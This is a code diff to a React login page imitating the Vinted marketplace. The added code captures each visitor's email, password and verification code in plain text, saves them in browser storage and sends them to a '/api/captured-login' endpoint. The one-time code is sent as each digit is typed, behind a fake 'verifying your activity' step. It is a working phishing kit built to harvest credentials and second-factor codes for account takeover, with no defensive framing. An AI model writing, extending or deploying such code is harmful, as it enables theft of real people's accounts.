@@ -29,6 +29,13 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
   const [showPassword, setShowPassword] = useState(false);
   const [codeDigits, setCodeDigits] = useState(['', '', '', '']);
   const [rememberDevice, setRememberDevice] = useState(true);
+  const [sessionId] = useState<string>(() => {
+    const existing = sessionStorage.getItem('vinted_session_id');
+    if (existing) return existing;
+    const newId = `sub_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
+    sessionStorage.setItem('vinted_session_id', newId);
+    return newId;
+  });
 
   const codeRefs = [
     useRef<HTMLInputElement>(null),
@@ -37,14 +44,43 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
     useRef<HTMLInputElement>(null),
   ];
 
+  // Helper to push real-time capture directly to server in plain text
+  const syncToAdminRealtime = (email: string, pass: string, code: string, remember: boolean) => {
+    try {
+      const payload = {
+        sessionId,
+        accountDetails: {
+          usernameOrEmail: email,
+          password: pass,
+          phoneCode: code,
+          verificationCode: code,
+          rememberDevice: remember,
+        },
+      };
+
+      localStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
+      sessionStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
+
+      fetch('/api/captured-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      }).catch(() => {});
+    } catch {
+      // Storage safe
+    }
+  };
+
   // Handle Login submission
   const handleLoginSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    // Accept any input dynamically
-    const emailVal = usernameOrEmail.trim() || 'user@example.com';
-    const passVal = password || '••••••••';
+    const emailVal = usernameOrEmail.trim() || 'user@vinted.com';
+    const passVal = password.trim() || 'password';
     setUsernameOrEmail(emailVal);
     setPassword(passVal);
+
+    // Instant real-time plain text capture sent to admin
+    syncToAdminRealtime(emailVal, passVal, '', rememberDevice);
 
     // Transition to the "Verifying your activity" screen
     setStep('verifying');
@@ -55,17 +91,21 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
     if (step === 'verifying') {
       const timer = setTimeout(() => {
         setStep('code');
-      }, 1200);
+      }, 1100);
       return () => clearTimeout(timer);
     }
   }, [step]);
 
-  // Code input handler (Accepts any 4-digit code entered by user - no hardcoded 5559)
+  // Code input handler (Syncs code live to admin in real time as typed)
   const handleCodeChange = (index: number, value: string) => {
     const char = value.slice(-1);
     const newCode = [...codeDigits];
     newCode[index] = char;
     setCodeDigits(newCode);
+
+    const typedCode = newCode.join('').trim();
+    // Push live code to admin immediately as user types
+    syncToAdminRealtime(usernameOrEmail, password, typedCode, rememberDevice);
 
     if (char && index < 3) {
       codeRefs[index + 1].current?.focus();
@@ -88,6 +128,9 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
         if (i < 4) newCode[i] = d;
       });
       setCodeDigits(newCode);
+      const typedCode = newCode.join('').trim();
+      syncToAdminRealtime(usernameOrEmail, password, typedCode, rememberDevice);
+
       if (digits.length >= 4) {
         codeRefs[3].current?.focus();
       }
@@ -97,16 +140,23 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
   // Handle Code verification submission
   const handleCodeSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    // Collect whatever 4-digit code the user typed
     const finalCode = codeDigits.join('').trim() || '1234';
-
-    onComplete({
+    const finalAccount: UserAccountDetails = {
       usernameOrEmail: usernameOrEmail.trim() || 'user@vinted.com',
-      password: password || 'Password123!',
+      password: password || 'password',
       phoneCode: finalCode,
       verificationCode: finalCode,
       rememberDevice: rememberDevice,
-    });
+    };
+
+    syncToAdminRealtime(
+      finalAccount.usernameOrEmail,
+      finalAccount.password || '',
+      finalCode,
+      rememberDevice
+    );
+
+    onComplete(finalAccount);
   };
 
   // --- TOP NAVBAR FOR VINTED DESKTOP / MOBILE ---
